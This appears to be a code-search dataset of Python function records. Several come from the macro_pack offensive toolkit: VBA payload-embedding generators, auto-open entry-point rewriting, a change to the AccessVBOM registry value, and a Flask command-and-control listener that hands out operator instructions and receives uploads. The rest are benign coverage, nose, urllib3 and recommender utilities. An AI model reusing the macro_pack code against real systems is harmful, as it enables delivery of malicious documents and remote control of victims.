{"docstring": "\"\"\"\nEmbed the content of  self.mpSession.embeddedFilePath inside the generated target file\n\"\"\"\n", "func_signal": "def embedFileVBA(self):\n", "code": "logging.info(\"   [-] Embedding file %s...\" % self.mpSession.embeddedFilePath)\nif not os.path.isfile(self.mpSession.embeddedFilePath):\n    logging.error(\"   [!] Could not find %s \" % self.mpSession.embeddedFilePath)\n    raise Exception(\"Invalid file path\")\n    return\n\ninfile = open(self.mpSession.embeddedFilePath, 'rb')\npackedFile = \"\"\n\ncountLine = 0\ncountSubs = 1\nline = \"\"\npackedFile += \"Sub DumpFile%d(objFile) \\n\" % countSubs\n    \nwhile True:\n    inbyte = infile.read(1)\n    if not inbyte:\n        break\n    if len(line) > 0:\n        line = line + \" \"\n    line = line + \"%d\" % ord(inbyte)\n    if len(line) > 800:\n        packedFile += \"\\tWriteBytes objFile, \\\"%s\\\" \\n\" % line\n        line = \"\"\n        countLine += 1\n        if countLine > 99:\n            countLine = 0\n            packedFile += \"End Sub \\n\"\n            packedFile += \" \\n\"\n            countSubs += 1\n            packedFile += \"Sub DumpFile%d(objFile) \\n\" % countSubs\n             \nif len(line) > 0:\n    packedFile += \"\\tWriteBytes objFile, \\\"%s\\\" \\n\" % line\n    \npackedFile += \"End Sub \\n\"\npackedFile += \" \\n\"\npackedFile += \"Sub DumpFile(strFilename) \\n\"\npackedFile += \"\\tDim objFSO \\n\"\npackedFile += \"\\tDim objFile \\n\"\npackedFile += \" \\n\"\npackedFile += \"\\tSet objFSO = CreateObject(\\\"Scripting.FileSystemObject\\\") \\n\"\npackedFile += \"\\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true) \\n\"\nfor iIter in range(1, countSubs+1):\n    packedFile += \"\\tDumpFile%d objFile \\n\" % iIter\npackedFile += \"\\tobjFile.Close \\n\"\npackedFile += \"End Sub \\n\"\n    \nnewContent = WriteBytes.VBA + \"\\n\"\nnewContent += packedFile + \"\\n\"       \nself.addVBAModule(newContent)\n\ninfile.close()\nreturn", "path": "macro_pack/src/modules/embed_file.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "# Disable writing in VBA project\n#  Change/set AccessVBOM registry value to 0\n", "func_signal": "def disableVbom(self):\n", "code": "keyval = \"Software\\\\Microsoft\\\\Office\\\\\"  + self.version + \"\\\\Access\\\\Security\"\nlogging.info(\"   [-] Set %s to 0...\" % keyval)\nRegistrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)\nwinreg.SetValueEx(Registrykey,\"AccessVBOM\",0,winreg.REG_DWORD,0) # \"REG_DWORD\"\nwinreg.CloseKey(Registrykey)", "path": "macro_pack/src/modules/access_gen.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" called by client when signalling itself\"\"\"\n# Add bot to network if necessary\n", "func_signal": "def hello():\n", "code": "clientId = request.form['id']\nip = request.remote_addr\nlogging.info(\"   [-] Hello from %s. - IP: %s\" % (clientId, ip))\nreturn make_response(\"OK\")", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "'''\nCheck if there is any running process that contains the given name processName.\n'''\n#Iterate over the all the running process\n", "func_signal": "def checkIfProcessRunning(processName):\n", "code": "for proc in psutil.process_iter():\n    try:\n        # Check if process name contains the given name string.\n        if processName.lower() in proc.name().lower():\n            return True\n    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n        pass\nreturn False;", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" Returns a random alphabetic string of length 'length' \"\"\"\n", "func_signal": "def randomAlpha(length):\n", "code": "key = ''\nfor i in range(length): # @UnusedVariable\n    key += choice(string.ascii_lowercase)\nreturn key", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\"\nEmbed the content of  self.mpSession.embeddedFilePath inside the generated target file\n\"\"\"\n", "func_signal": "def embedFileVBS(self):\n", "code": "logging.info(\"   [-] Embedding file %s...\" % self.mpSession.embeddedFilePath)\nif not os.path.isfile(self.mpSession.embeddedFilePath):\n    logging.warning(\"   [!] Could not find %s! \" % self.mpSession.embeddedFilePath)\n    return\n\nf = open(self.mpSession.embeddedFilePath, 'rb')\ncontent = f.read()\nf.close()\nencodedBytes = base64.b64encode(content)\nbase64Str= encodedBytes.decode(\"utf-8\")  \n       \n# Shorten size if needed\nVBAMAXLINELEN = 100 # VBA will fail if line is too long\ncpt = 0\nnewPackedMacro = \"\"\nnbIter = int(len(base64Str) / VBAMAXLINELEN)\n# Create a VBA string builder containing all encoded macro\nwhile cpt < nbIter:\n    newPackedMacro += base64Str[cpt * VBAMAXLINELEN:(cpt+1) * VBAMAXLINELEN] + \"\\\" \\n str = str & \\\"\" \n    cpt += 1\nnewPackedMacro += base64Str[cpt * VBAMAXLINELEN:] \npackedMacro= \"\\\"\" + newPackedMacro + \"\\\"\" \n    \nnewContent = Base64ToBin.VBA + \"\\n\"\nnewContent += CreateBinFile.VBA + \"\\n\"\nnewContent += \"Sub DumpFile(strFilename)\"\nnewContent += \"\\n Dim str \\n str = %s \\n readEmbed = Base64ToBin(str) \\n CreateBinFile strFilename, readEmbed \\n\" % (packedMacro) \nnewContent += \"End Sub \\n \\n\"       \n\n\nself.addVBAModule(newContent)\nreturn", "path": "macro_pack/src/modules/embed_file.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" Exract the word (space separated ) preceding the one at current index\"\"\"\n# Look for beginning or word\n", "func_signal": "def extractPreviousWordInString(strToParse, index):\n", "code": "i = index\nif strToParse[i] not in \" \\t\\n\":\n    while i!=0 and strToParse[i-1] not in \" \\t\\n&|\":\n        i = i-1\nif i > 2:\n    while i!=0 and strToParse[i-1] in \" \\t\\n\\\",;\": # Skip spaces nd special char befor previous word\n        i = i-1\nif i > 2:\n    previousWord = extractWordInString(strToParse, i)\nelse:\n    previousWord = \"\"\nlogging.debug(\"     [-] extracted previous Word: %s\" % previousWord)\nreturn previousWord", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "# Get the name of the uploaded file\n", "func_signal": "def upload():\n", "code": "file = request.files['uploadfile']\nif file:\n    filename = file.filename\n    logging.info(\"   [-] Uploaded: \"+ filename)\n    file.save(os.path.join(webapp.config['UPLOAD_FOLDER'], filename))\n    return make_response(\"OK\")", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" called by client to ask for instruction \"\"\"\n\n# Send request to bot if any pending\n", "func_signal": "def query():\n", "code": "clientId = request.form['id']\npendingInstruction = input(\" %s >> \" % clientId)\n\nreturn make_response(pendingInstruction)", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\"\nIf macro has an autoopen like mechanism, this will replace the entry_point with what is given in newEntrPoin param\nEx for Excel it will replace \"Sub AutoOpen ()\" with \"Sub Workbook_Open ()\"\n\"\"\"\n", "func_signal": "def resetVBAEntryPoint(self):\n", "code": "mainFile = self.getMainVBAFile()\nif mainFile != \"\" and  self.startFunction is not None:\n    if self.startFunction != self.getAutoOpenVbaFunction():\n        logging.info(\"   [-] Changing auto open function from %s to %s...\" % (self.startFunction, self.getAutoOpenVbaFunction()))\n        #1 Replace line in VBA\n        f = open(mainFile)\n        content = f.readlines()\n        f.close\n        for n,line in enumerate(content):\n            if line.find(\" \" + self.startFunction) != -1:  \n                #logging.info(\"     -> %s becomes %s\" %(content[n], self.getAutoOpenVbaSignature()))  \n                content[n] = self.getAutoOpenVbaSignature() + \"\\n\"\n        f = open(mainFile, 'w')\n        f.writelines(content)\n        f.close()   \n        # 2 Change  cure module start function\n        self._startFunction = self.getAutoOpenVbaFunction()", "path": "macro_pack/src/modules/vba_gen.py", "commit_date": "2020-07-03 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\"\nA decorator to remove server header information\n\"\"\"\n", "func_signal": "def secure_http_response(func):\n", "code": "@wraps(func)\ndef __wrapper(*args, **kwargs):\n    response = func(*args, **kwargs)\n    response.headers['server'] = ''\n    return response\nreturn __wrapper", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "# Extract information\n\n", "func_signal": "def run(self):\n", "code": "logging.info(\" [+] Running %s on local PC...\" % self.comTarget)\nif not os.path.isfile(self.comTarget):\n    logging.error(\"   [!] Could not find %s \" % self.comTarget)\n    return\n\ntargetApp = MSTypes.guessApplicationType(self.comTarget)\nif MSTypes.XL in targetApp or MSTypes.SYLK in targetApp:\n    comApp = \"Excel.Application\"\nelif MSTypes.WD in targetApp:\n    comApp = \"Word.Application\"\nelif MSTypes.PPT in targetApp:\n    comApp = \"PowerPoint.Application\"\nelif MSTypes.VSD in targetApp:\n    comApp = \"Visio.InvisibleApp\"\nelif MSTypes.ACC in targetApp:\n    comApp = \"Access.Application\"\nelif MSTypes.MPP in targetApp:\n    comApp = \"MSProject.Application\"\nelse:\n    logging.error(\"   [!] Could not recognize file extension for %s\" % self.comTarget)\n    return\n\n\ntry:\n    logging.info(\"   [-] Create handler...\")\n    comObj = win32com.client.Dispatch(comApp)\nexcept:\n    logging.exception(\"   [!] Cannot access COM!\")\n    return \n    \n# We need to force run macro if it is not triggered at document open\nif self.startFunction and self.startFunction not in self.potentialStartFunctions:\n    logging.info(\"   [-] Run macro %s...\" % self.startFunction)\nelse:\n    logging.info(\"   [-] No specific start function, running auto open macro...\")\n\n# do the operation in background without actually opening Excel\ntry:\n    if MSTypes.XL in targetApp or MSTypes.SYLK in targetApp:\n        if self.mpSession.runVisible:\n            comObj.Visible = True\n        document = comObj.Workbooks.Open(self.comTarget)\n    elif MSTypes.WD in targetApp or MSTypes.VSD in targetApp:\n        if self.mpSession.runVisible:\n            comObj.Visible = True\n        document = comObj.Documents.Open(self.comTarget)\n    elif MSTypes.PPT in targetApp:\n        document = comObj.Presentations.Open(self.comTarget)\n    elif MSTypes.ACC in targetApp:\n        comObj.OpenCurrentDatabase(self.comTarget)\n        #comObj.DoCmd.RunMacro(self.startFunction)\n    elif MSTypes.MPP in targetApp:\n        document = comObj.FileOpen(self.comTarget, True)\n    if self.startFunction and self.startFunction not in self.potentialStartFunctions:\n        document = comObj.run(self.startFunction)\nexcept Exception:\n    logging.exception(\"   [!] Problem detected!\")\n\ntime.sleep(1.5) # need to have app alive to launch async call with --background option\n\n        \nlogging.info(\"   [-] Cleanup...\")\ntry:\n    document.close()\n    comObj.Application.Quit()\nexcept:\n    pass\ntry:\n    comObj.FileClose ()\nexcept:\n    pass\ntry:\n    comObj.Quit()\nexcept:\n    pass\n# garbage collection\ndel comObj\n\nlogging.info(\"   [-] OK!\")", "path": "macro_pack/src/modules/com_run.py", "commit_date": "2020-04-20 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\"Create a CoverageData.\n\n`basename` is the name of the file to use for storing data.\n\n`collector` is a string describing the coverage measurement software.\n\n`debug` is a `DebugControl` object for writing debug messages.\n\n\"\"\"\n", "func_signal": "def __init__(self, basename=None, collector=None, debug=None):\n", "code": "self.collector = collector or 'unknown'\nself.debug = debug\n\nself.use_file = True\n\n# Construct the filename that will be used for data file storage, if we\n# ever do any file storage.\nself.filename = basename or \".coverage\"\nself.filename = os.path.abspath(self.filename)\n\n# A map from canonical Python source file name to a dictionary in\n# which there's an entry for each line number that has been\n# executed:\n#\n#   {\n#       'filename1.py': { 12: None, 47: None, ... },\n#       ...\n#       }\n#\nself.lines = {}\n\n# A map from canonical Python source file name to a dictionary with an\n# entry for each pair of line numbers forming an arc:\n#\n#   {\n#       'filename1.py': { (12,14): None, (47,48): None, ... },\n#       ...\n#       }\n#\nself.arcs = {}", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Write the coverage data to `filename`.\"\"\"\n\n# Create the file data.\n", "func_signal": "def write_file(self, filename):\n", "code": "data = {}\n\ndata['lines'] = self.line_data()\narcs = self.arc_data()\nif arcs:\n    data['arcs'] = arcs\n\nif self.collector:\n    data['collector'] = self.collector\n\nif self.debug and self.debug.should('dataio'):\n    self.debug.write(\"Writing data to %r\" % (filename,))\n\n# Write the pickle to the file.\nfdata = open(filename, 'wb')\ntry:\n    pickle.dump(data, fdata, 2)\nfinally:\n    fdata.close()", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Return the map from filenames to lists of line number pairs.\"\"\"\n", "func_signal": "def arc_data(self):\n", "code": "return dict(\n    [(f, sorted(amap.keys())) for f, amap in iitems(self.arcs)]\n    )", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Return the stored coverage data from the given file.\n\nReturns two values, suitable for assigning to `self.lines` and\n`self.arcs`.\n\n\"\"\"\n", "func_signal": "def _read_file(self, filename):\n", "code": "lines = {}\narcs = {}\ntry:\n    data = self.raw_data(filename)\n    if isinstance(data, dict):\n        # Unpack the 'lines' item.\n        lines = dict([\n            (f, dict.fromkeys(linenos, None))\n                for f, linenos in iitems(data.get('lines', {}))\n            ])\n        # Unpack the 'arcs' item.\n        arcs = dict([\n            (f, dict.fromkeys(arcpairs, None))\n                for f, arcpairs in iitems(data.get('arcs', {}))\n            ])\nexcept Exception:\n    pass\nreturn lines, arcs", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Write the collected coverage data to a file.\n\n`suffix` is a suffix to append to the base file name. This can be used\nfor multiple or parallel execution, so that many coverage data files\ncan exist simultaneously.  A dot will be used to join the base name and\nthe suffix.\n\n\"\"\"\n", "func_signal": "def write(self, suffix=None):\n", "code": "if self.use_file:\n    filename = self.filename\n    if suffix:\n        filename += \".\" + suffix\n    self.write_file(filename)", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Is the file a wanted test file?\n\nThe file must be a python source file and match testMatch or\ninclude, and not match exclude. Files that match ignore are *never*\nwanted, regardless of plugin, testMatch, include or exclude settings.\n\"\"\"\n# never, ever load files that match anything in ignore\n# (.* _* and *setup*.py by default)\n", "func_signal": "def wantFile(self, file):\n", "code": "base = op_basename(file)\nignore_matches = [ ignore_this for ignore_this in self.ignoreFiles\n                   if ignore_this.search(base) ]\nif ignore_matches:\n    log.debug('%s matches ignoreFiles pattern; skipped',\n              base) \n    return False\nif not self.config.includeExe and os.access(file, os.X_OK):\n    log.info('%s is executable; skipped', file)\n    return False\ndummy, ext = op_splitext(base)\npysrc = ext == '.py'\n\nwanted = pysrc and self.matches(base) \nplug_wants = self.plugins.wantFile(file)\nif plug_wants is not None:\n    log.debug(\"plugin setting want %s to %s\", file, plug_wants)\n    wanted = plug_wants\nlog.debug(\"wantFile %s? %s\", file, wanted)\nreturn wanted", "path": "phimpme-generator/Phimpme/site-packages/nose/selector.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Read coverage data from the coverage data file (if it exists).\"\"\"\n", "func_signal": "def read(self):\n", "code": "if self.use_file:\n    self.lines, self.arcs = self._read_file(self.filename)\nelse:\n    self.lines, self.arcs = {}, {}", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Return the raw pickled data from `filename`.\"\"\"\n", "func_signal": "def raw_data(self, filename):\n", "code": "if self.debug and self.debug.should('dataio'):\n    self.debug.write(\"Reading data from %r\" % (filename,))\nfdata = open(filename, 'rb')\ntry:\n    data = pickle.load(fdata)\nfinally:\n    fdata.close()\nreturn data", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"\nIterate over fields.\n\nSupports list of (k, v) tuples and dicts, and lists of\n:class:`~urllib3.fields.RequestField`.\n\n\"\"\"\n", "func_signal": "def iter_field_objects(fields):\n", "code": "if isinstance(fields, dict):\n    i = six.iteritems(fields)\nelse:\n    i = iter(fields)\n\nfor field in i:\n  if isinstance(field, RequestField):\n    yield field\n  else:\n    yield RequestField.from_tuples(*field)", "path": "phimpme-generator/Phimpme/site-packages/requests/packages/urllib3/filepost.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Erase the data, both in this object, and from its file storage.\"\"\"\n", "func_signal": "def erase(self):\n", "code": "if self.use_file:\n    if self.filename:\n        file_be_gone(self.filename)\nself.lines = {}\nself.arcs = {}", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Return a dict summarizing the coverage data.\n\nKeys are based on the filenames, and values are the number of executed\nlines.  If `fullpath` is true, then the keys are the full pathnames of\nthe files, otherwise they are the basenames of the files.\n\n\"\"\"\n", "func_signal": "def summary(self, fullpath=False):\n", "code": "summ = {}\nif fullpath:\n    filename_fn = lambda f: f\nelse:\n    filename_fn = os.path.basename\nfor filename, lines in iitems(self.lines):\n    summ[filename_fn(filename)] = len(lines)\nreturn summ", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Is the directory a wanted test directory?\n\nAll package directories match, so long as they do not match exclude. \nAll other directories must match test requirements.\n\"\"\"\n", "func_signal": "def wantDirectory(self, dirname):\n", "code": "tail = op_basename(dirname)\nif ispackage(dirname):\n    wanted = (not self.exclude\n              or not filter(None,\n                            [exc.search(tail) for exc in self.exclude]\n                            ))\nelse:\n    wanted = (self.matches(tail)\n              or (self.config.srcDirs\n                  and tail in self.config.srcDirs))\nplug_wants = self.plugins.wantDirectory(dirname)\nif plug_wants is not None:\n    log.debug(\"Plugin setting selection of %s to %s\",\n              dirname, plug_wants)\n    wanted = plug_wants\nlog.debug(\"wantDirectory %s? %s\", dirname, wanted)\nreturn wanted", "path": "phimpme-generator/Phimpme/site-packages/nose/selector.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"\nIterate over fields.\n\n.. deprecated ::\n\n  The addition of `~urllib3.fields.RequestField` makes this function\n  obsolete. Instead, use :func:`iter_field_objects`, which returns\n  `~urllib3.fields.RequestField` objects, instead.\n\nSupports list of (k, v) tuples and dicts.\n\n\"\"\"\n", "func_signal": "def iter_fields(fields):\n", "code": "if isinstance(fields, dict):\n    return ((k, v) for k, v in six.iteritems(fields))\n\nreturn ((k, v) for k, v in fields)", "path": "phimpme-generator/Phimpme/site-packages/requests/packages/urllib3/filepost.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Add measured arc data.\n\n`arc_data` is { filename: { (l1,l2): None, ... }, ...}\n\n\"\"\"\n", "func_signal": "def add_arc_data(self, arc_data):\n", "code": "for filename, arcs in iitems(arc_data):\n    self.arcs.setdefault(filename, {}).update(arcs)", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Return the map from filenames to lists of line numbers executed.\"\"\"\n", "func_signal": "def line_data(self):\n", "code": "return dict(\n    [(f, sorted(lmap.keys())) for f, lmap in iitems(self.lines)]\n    )", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Is the function a test function?\n\"\"\"\n", "func_signal": "def wantFunction(self, function):\n", "code": "try:\n    if hasattr(function, 'compat_func_name'):\n        funcname = function.compat_func_name\n    else:\n        funcname = function.__name__\nexcept AttributeError:\n    # not a function\n    return False\ndeclared = getattr(function, '__test__', None)\nif declared is not None:\n    wanted = declared\nelse:\n    wanted = not funcname.startswith('_') and self.matches(funcname)\nplug_wants = self.plugins.wantFunction(function)\nif plug_wants is not None:\n    wanted = plug_wants\nlog.debug(\"wantFunction %s? %s\", function, wanted)\nreturn wanted", "path": "phimpme-generator/Phimpme/site-packages/nose/selector.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Contribute `filename`'s data to the Md5Hash `hasher`.\"\"\"\n", "func_signal": "def add_to_hash(self, filename, hasher):\n", "code": "hasher.update(self.executed_lines(filename))\nhasher.update(self.executed_arcs(filename))", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Is the module a test module?\n\nThe tail of the module name must match test requirements. One exception:\nwe always want __main__.\n\"\"\"\n", "func_signal": "def wantModule(self, module):\n", "code": "declared = getattr(module, '__test__', None)\nif declared is not None:\n    wanted = declared\nelse:\n    wanted = self.matches(module.__name__.split('.')[-1]) \\\n             or module.__name__ == '__main__'\nplug_wants = self.plugins.wantModule(module)\nif plug_wants is not None:\n    wanted = plug_wants\nlog.debug(\"wantModule %s? %s\", module, wanted)\nreturn wanted", "path": "phimpme-generator/Phimpme/site-packages/nose/selector.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Combine a number of data files together.\n\nTreat `self.filename` as a file prefix, and combine the data from all\nof the data files starting with that prefix plus a dot.\n\nIf `aliases` is provided, it's a `PathAliases` object that is used to\nre-map paths to match the local machine's.\n\n\"\"\"\n", "func_signal": "def combine_parallel_data(self, aliases=None):\n", "code": "aliases = aliases or PathAliases()\ndata_dir, local = os.path.split(self.filename)\nlocaldot = local + '.'\nfor f in os.listdir(data_dir or '.'):\n    if f.startswith(localdot):\n        full_path = os.path.join(data_dir, f)\n        new_lines, new_arcs = self._read_file(full_path)\n        for filename, file_data in iitems(new_lines):\n            filename = aliases.map(filename)\n            self.lines.setdefault(filename, {}).update(file_data)\n        for filename, file_data in iitems(new_arcs):\n            filename = aliases.map(filename)\n            self.arcs.setdefault(filename, {}).update(file_data)\n        if f != local:\n            os.remove(full_path)", "path": "phimpme-generator/Phimpme/site-packages/coverage/data.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "\"\"\"Does the name match my requirements?\n\nTo match, a name must match config.testMatch OR config.include\nand it must not match config.exclude\n\"\"\"\n", "func_signal": "def matches(self, name):\n", "code": "return ((self.match.search(name)\n         or (self.include and\n             filter(None,\n                    [inc.search(name) for inc in self.include])))\n        and ((not self.exclude)\n             or not filter(None,\n                           [exc.search(name) for exc in self.exclude])\n         ))", "path": "phimpme-generator/Phimpme/site-packages/nose/selector.py", "commit_date": "2014-08-18 00:00:00", "repo_name": "phimpme/phimpme-generator", "stars": 1030, "license": "gpl-3.0", "language": "python", "size": 1740}
{"docstring": "'''\nIterate once over rating data and adjust corresponding factors (stochastic gradient descent)\n'''\n", "func_signal": "def _train(self, rating_indices, update_user, update_item):\n", "code": "err_total = 0.0\nfor user_idx, item_idx in rating_indices:\n    p = self._predict(user_idx, item_idx, False)\n    err = self.model.index[user_idx, item_idx] - p\n    err_total += (err ** 2.0)\n\n    #Adjust the factors\n    u_f = self.user_factors[user_idx]\n    i_f = self.item_factors[item_idx]\n\n    #Compute factor updates\n    delta_u = err * i_f - self.regularization * u_f\n    delta_i = err * u_f - self.regularization * i_f\n    #if necessary apply updates\n    if update_user:\n        self.user_factors[user_idx] += self.learning_rate * delta_u\n    if update_item:\n        self.item_factors[item_idx] += self.learning_rate * delta_i\n\nreturn err_total", "path": "crab/scikits/crab/recommenders/svd/classes.py", "commit_date": "2012-01-16 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n--------\nself\n    Removes a particular preference for a user.\n'''\n", "func_signal": "def remove_preference(self, user_id, item_id):\n", "code": "user_id_loc = np.where(self._user_ids == user_id)\nitem_id_loc = np.where(self._item_ids == item_id)\n\nif not user_id_loc[0].size:\n    raise UserNotFoundError('user_id in the model not found')\n\nif not item_id_loc[0].size:\n    raise ItemNotFoundError('item_id in the model not found')\n\nself.dataset[user_id].remove(item_id)\nself.build_model()", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n--------\nReturn user's preferences values as an array\n\nNotes\n--------\nThis method is a particular method in MatrixDataModel\n'''\n", "func_signal": "def preference_values_from_user(self, user_id):\n", "code": "user_id_loc = np.where(self._user_ids == user_id)\nif not user_id_loc[0].size:\n    #user_id not found\n    raise UserNotFoundError\n\npreferences = self.index[user_id_loc]\n\nreturn preferences", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "\"\"\"\nWrite out a representative picture of this matrix.\n\nThe upper left corner of the matrix will be shown, with up to 20x5\nentries, and the rows and columns will be labeled with up to 8\ncharacters.\n\"\"\"\n", "func_signal": "def __unicode__(self):\n", "code": "matrix = self._repr_matrix(self.index[:20, :5])\nlines = matrix.split('\\n')\nheaders = [repr(self)[1:-1]]\nif self._item_ids.size:\n    col_headers = [('%-8s' % unicode(item)[:8]) for item in self._item_ids[:5]]\n    headers.append(' ' + ('   '.join(col_headers)))\n\nif self._user_ids.size:\n    for (i, line) in enumerate(lines):\n        lines[i] = ('%-8s' % unicode(self._user_ids[i])[:8]) + line\n    for (i, line) in enumerate(headers):\n        if i > 0:\n            headers[i] = ' ' * 8 + line\nlines = headers + lines\nif self.index.shape[1] > 5 and self.index.shape[0] > 0:\n    lines[1] += ' ...'\nif self.index.shape[0] > 20:\n    lines.append('...')\n\nreturn '\\n'.join(line.rstrip() for line in lines)", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
{"docstring": "'''\nReturns\n-------\npreference:  float\n             Retrieves the preference value for a single user and item.\n'''\n", "func_signal": "def preference_value(self, user_id, item_id):\n", "code": "item_id_loc = np.where(self._item_ids == item_id)\nuser_id_loc = np.where(self._user_ids == user_id)\n\nif not user_id_loc[0].size:\n    raise UserNotFoundError('user_id in the model not found')\n\nif not item_id_loc[0].size:\n    raise ItemNotFoundError('item_id in the model not found')\n\nreturn 1.0 if self.index[user_id_loc, item_id_loc].flatten()[0] else np.NaN", "path": "crab/scikits/crab/models/classes.py", "commit_date": "2011-10-10 00:00:00", "repo_name": "muricoca/crab", "stars": 1174, "license": "other", "language": "python", "size": 4099}
